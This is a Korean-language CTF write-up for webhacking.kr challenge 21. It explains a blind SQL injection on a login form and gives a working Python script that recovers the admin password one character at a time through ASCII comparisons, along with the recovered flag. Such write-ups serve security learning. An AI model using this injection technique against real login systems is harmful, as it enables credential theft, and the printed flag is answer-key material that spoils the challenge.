#21
==

이번 문제는 blind sql 문제라는 것을 들어가자마자 알 수 있다.

![](https://postfiles.pstatic.net/MjAyMDAxMTdfNzYg/MDAxNTc5MjUzNDg4MTg3.Wy__Ix16715l6yop0I6NW3okfiegobfrxoR_fAIyEBMg.1JVyv9riTB_QHJ5e34U-G2yqz_tXkPhXqGMtqGAMcJEg.JPEG.rlaeoghks823/K-055.jpg?type=w773)

id와 pw가 지정된 값이 아니면 `Result : login fail`가 나온다.

id 값에 `admin' and 1=1#`을 넣어봤더니 다음과 같은 결과값이 나왔다.  
`Result : wrong password`

따라서 이 결과 값을 이용하면 pw를 알아낼 수 있다. 

파이썬 코드를 찾은 다음 아래와 같이 21번 문제에 맞게 수정해주었다.

```
import requests

answer= ""

for i in range(1,37):
    for j in range(32,127):
        url = "https://webhacking.kr/challenge/bonus-1/index.php?id=admin' and ascii(substr(pw,%d,1)) = %d-- &pw=1" %(i,j)
        cookies={
            'PHPSESSID' : 'mmfd82ft16qtijkgfutd4h2cmd'
        }
        res = requests.get(url,cookies=cookies)
        if res.text.find('wrong password') != -1:
            answer=answer+chr(j)
            print(answer)
            break
        else:
            continue
            
print('정답')
print(answer)
```

파이썬 코드를 해석해보면 id 값에 pw를 1칸씩 잘라서 아스키코드값 32부터 127까지 다 비교해본다.  
만약 참값이 나오면 결과는 `Result : wrong password`가 나오게 되므로 이 값이 나오는 코드값을 문자로 변환해 answer에 저장해준다.

그리고 마지막에 answer를 출력해주는 간단한 코드이다.

이런식으로 간단하게 pw값을 구해보면 pw값이 `there_is_no_rest_for_the_white_angel`임을 알 수 있다.
